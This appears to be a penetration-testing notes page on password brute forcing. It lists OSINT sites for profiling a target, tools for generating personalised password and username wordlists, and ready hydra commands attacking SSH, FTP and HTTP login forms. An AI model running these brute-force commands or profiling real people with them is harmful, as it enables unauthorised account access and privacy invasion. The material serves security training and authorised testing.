---
description: >-
  After having success at username enumeration, an attacker is often just one
  step from the goal of bypassing authentication, and that step is the user’s
  password.
---

# Password Brute Forcing



### Personalized Word lists

To create a personalized word list for a username, we will need to collect information about them. When gathering information, use the following OSINT tools:

**OSINT Framework** - [https://osintframework.com/](https://osintframework.com/)

**Check Username** - [https://www.social-searcher.com/](https://www.social-searcher.com/)

**That's Them** - [https://thatsthem.com/](https://thatsthem.com/)

**Social Searcher** - [https://www.social-searcher.com/](https://www.social-searcher.com/)

**Reverse Email Search** - [https://epieos.com/](https://epieos.com/)

**Face Recognition From Image**  - [https://pimeyes.com/en](https://pimeyes.com/en)



### Generate Password Word list

Once we've gathered information about our target, we can use "Cupp" to create a personalized word list for use. [https://github.com/Mebus/cupp](https://github.com/Mebus/cupp)



### Generate Username Word list

We can use Username Anarchy to create a word list of possible usernames if we can't find the username for our target: [https://github.com/urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)







### Service Authentication Brute Forcing:

We can use a variety of different tools to attack a login service.&#x20;

_**Attacking SSH:**_

```bash
hydra -L bill.txt -P william.txt -u -f ssh://178.35.49.134:22 -t 4
```

_**Attacking FTP:**_

```bash
hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1
```

_**Attacking HTTP:**_

```bash
hydra -l admin -P wordlist.txt -f SERVER_IP -s PORT http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
```
